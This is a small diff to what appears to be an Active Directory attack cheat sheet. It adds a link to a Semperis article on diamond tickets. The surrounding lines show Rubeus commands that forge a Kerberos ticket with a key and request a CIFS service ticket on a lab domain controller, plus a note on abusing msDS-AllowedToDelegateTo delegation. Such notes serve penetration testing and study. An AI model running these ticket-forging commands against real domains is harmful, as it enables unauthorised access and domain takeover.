@@ -538,6 +538,7 @@ Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcb
 ```
 .\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
 ```
+For detailed explanation, read this article by Semperis [here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
 
 ### msDS-AllowedToDelegateTo
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
